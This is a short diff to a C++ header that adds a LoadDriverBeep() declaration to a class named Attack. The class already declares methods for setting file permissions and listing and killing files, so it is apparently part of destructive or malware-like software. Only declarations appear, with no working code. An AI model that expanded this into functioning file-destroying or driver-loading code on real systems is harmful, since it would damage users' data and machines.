@@ -27,5 +27,6 @@ class Attack {
 public:
 	void SetFilePermission(LPCWSTR filename);
 	vector<wstring> list_n_kill_files(wstring path);
+	void LoadDriverBeep();
 };
 
